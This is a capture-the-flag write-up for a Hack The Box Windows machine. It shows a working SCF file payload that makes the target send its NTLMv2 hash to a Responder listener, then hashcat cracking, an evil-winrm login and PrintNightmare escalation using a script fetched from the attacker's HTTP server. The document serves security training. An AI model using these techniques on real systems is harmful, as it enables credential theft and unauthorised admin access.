In this Box, we are going to abuse the ability of uploading the firmware of a shared printer and capture
the NTLMv2 hash of a user on this machine. By cracking the hash there is nothing that can stop us from logging in
except the smb shares aren't accessible so we will use evil-winrm to get the initial access, for the Administrator part we will make use of the vulnerable service "spooler" and add a user in the administrator group.

## Scanning :

```bash
nmap -T 4 -A -sV 10.10.11.106  -oN nmap_intial.txt
```

output :

```bash
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0

135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)

Host script results:

|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:

```

we can also run full port scan and will get :

```bash
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```

we have this port **5985** open , which we may utilize later [check](https://hacktricks.boitatech.com.br/pentesting/5985-5986-pentesting-winrm).

## Enumeration:

we can start by visiting the web page and it will ask us for a username:password for MFP firmware update center .

![image](/assets/images/Driver/20220226110700.png)

searching for MFP will find it stands for multi functioning printer , we can search for default credentials and find it is **"admin:admin"**

using them will login successfully :

![image](/assets/images/Driver/20220226111149.png)

- we can add "driver.htb" to the `/etc/hosts` and start fuzzing for any Vhosts but will find none.

- let's navigate around this site will find option Firmware Updates is working and asking for updating firmware

![image](/assets/images/Driver/20220226111320.png)

- we should now think about uploading some malicious file to gain a reverse shell , however it won't work.
- we can enumerate SMB that we have found earlier maybe will give us a lead
- ACCESS_DENIED from `smbclient -L //driver.htb`

- it seems SMB is running for the printer that is shared among the network

### SMB authentication :

- according to Microsoft Documentation :

```
NTLM and the older LAN Manager (LM) encryption are supported by Microsoft SMB Protocol. Both encryption methods use challenge-response authentication, where the server sends the client a random string and the client returns a computed response string that proves the client has sufficient credentials for access.
```

- so if the client (the target) tries to connect to us (attacker) the NTLM hash will be used to authenticate and then we can capture it with [Responder](https://github.com/lgandx/Responder) tool.

- and as the firmwares are checked when the file we upload is loaded at the reviewer file explorer or if he clicked it we can get the hash we need.

### Exploitation :

- searching for "smb share and printer firmware update exploit" will find this blog [here](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
- so creating the payload :

```cmd
[Shell]
Command=2
IconFile=\\<ip>\share\Mesbaha.ico
[Taskbar]
Command=ToggleDesktop
```

and name it as `"@hack.scf"` and before uploading it run Responder to capture the hash (hopefully):

```bash
sudo responder -I tun0 -rdwv
```

GREAT we have NTLMv2 hash now :

![image](/assets/images/Driver/20220226114609.png)

now we can try to crack it with hashcat :

```bash
hashcat -m 5600 tony_hash  /usr/share/wordlists/rockyou.txt
```

![image](/assets/images/Driver/20220226114733.png)

so we have username and password , now How can we login ?

## Foothold :

- Most of the **impacket** tools that takes username:password and try to login depends on SMB shares (i.e : `ADMIN$` and `C$`) and hence they are not accessible they won't work .
- Remember the port we have found in the full port scan ?
- reading the blog article i have mentioned above

```
If WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote PowerShell session on the machine (as if you were using SSH!)
```

- and they mentioned tool : [evil-winrm](https://github.com/Hackplayers/evil-winrm) that can help us do this

```bash
./evil-winrm.rb -u tony -p liltony -i driver.htb
```

- and the user.txt is in tony's Desktop

![image](/assets/images/Driver/20220226115238.png)

## Privilege escalation :

- you can start uploading Winpeas and follow the output but i will try first some manual checks
- first we know this Box is about printers and drivers maybe we find some exploit that way

![image](/assets/images/Driver/20220226115603.png)

- in the Microsoft post is says we can run `Get-Service -Name Spooler ` to check if it is running , and it is running

![image](/assets/images/Driver/20220226115710.png)

- Hence the service is running indeed we can try to exploit it and see if it works , there is this great one [here](https://github.com/JohnHammond/CVE-2021-34527) that we can try
- we can try to upload it then it will add for us a new user in Administrator group
- from machine side we can download the script from our http server with :
- **note** make sure you are in a writable directory

```bash
Invoke-WebRequest -Uri http://10.10.16.4:8888/CVE-2021-34527.ps1 -OutFile CVE.ps1
```

- running the exploit :

```powershell
Import-Module .\CVE.ps1
Invoke-Nightmare -NewUser "0xMesbaha" -NewPassword "supersecretpassword123"
```

![image](/assets/images/Driver/20220226120617.png)

and our new user has been added we can try to login with "evil-winrm" as well :

![image](/assets/images/Driver/20220226120835.png)

and if we run `net user <user_added>` will find :

![image](/assets/images/Driver/20220226120902.png)

the root flag is at Administrator Desktop .
